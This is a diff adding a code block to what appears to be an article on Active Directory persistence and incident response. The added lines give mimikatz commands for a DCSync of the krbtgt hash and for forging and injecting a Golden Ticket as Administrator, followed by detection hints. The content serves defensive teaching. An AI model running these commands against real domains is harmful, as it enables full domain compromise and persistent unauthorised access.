@@ -109,6 +109,12 @@
           account retains its previous key), which many IR runbooks miss the first
           time.
         </blockquote>
+        <pre><code># a Golden Ticket needs the krbtgt hash (recovered via DCSync as Domain Admin):
+mimikatz # lsadump::dcsync /user:krbtgt
+# forge + inject a TGT for any user (impacket equivalent: ticketer.py then export KRB5CCNAME)
+mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:&lt;S-1-5-...&gt; /krbtgt:&lt;hash&gt; /ptt
+# detection: TGTs with anomalous lifetimes, RC4 where AES is expected, and a
+# krbtgt whose password age does not match the two-rotation recovery.</code></pre>
 
         <h2>Directory ACL &amp; object backdoors</h2>
         <ul>
